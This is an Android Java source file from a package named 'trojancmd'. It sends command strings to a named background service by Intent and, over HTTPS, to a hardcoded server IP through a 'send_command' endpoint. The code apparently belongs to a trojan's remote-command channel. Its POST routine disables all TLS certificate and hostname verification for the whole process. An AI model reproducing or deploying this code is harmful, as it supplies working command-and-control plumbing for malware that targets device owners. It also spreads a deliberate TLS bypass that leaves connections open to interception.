package com.example.mm.trojancmd;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.cert.X509Certificate;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

public class sendCommand {
    public static String remoteURL = "https://118.190.159.86";

    public static void sendIntentCommand(String command, Context context){
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, intentInterface.intentServiceName));
        intent.setAction(intentInterface.Remote_CMD_EVENT);
        intent.putExtra(intentInterface.intentService_Param_RootDir, context.getExternalFilesDir(null).getAbsolutePath());
        intent.putExtra(intentInterface.Remote_CMD_EVENT_ACTION_ParamName, command);
        context.startService(intent);
    }

    public static void sendHTTPCommand(final String command, Context context){
        new Thread() {
            @Override
            public void run() {
                sendPost(remoteURL+"/api/v1.0/send_command/1", command);
            }
        }.start();
    }

    public static String sendPost(String url,String payload)
    {
        String msg = "";
        try{
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            HttpsURLConnection conn = (HttpsURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setReadTimeout(5000);
            conn.setConnectTimeout(5000);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            String data = payload;
            OutputStream out = conn.getOutputStream();
            out.write(data.getBytes());
            out.flush();
            if (conn.getResponseCode() == 200) {
                InputStream is = conn.getInputStream();
                ByteArrayOutputStream message = new ByteArrayOutputStream();
                int len = 0;
                byte buffer[] = new byte[1024];
                while ((len = is.read(buffer)) != -1) {
                    message.write(buffer, 0, len);
                }
                is.close();
                message.close();
                msg = new String(message.toByteArray());
                return msg;
            }
        }catch(Exception e){e.printStackTrace();}
        return msg;
    }
}
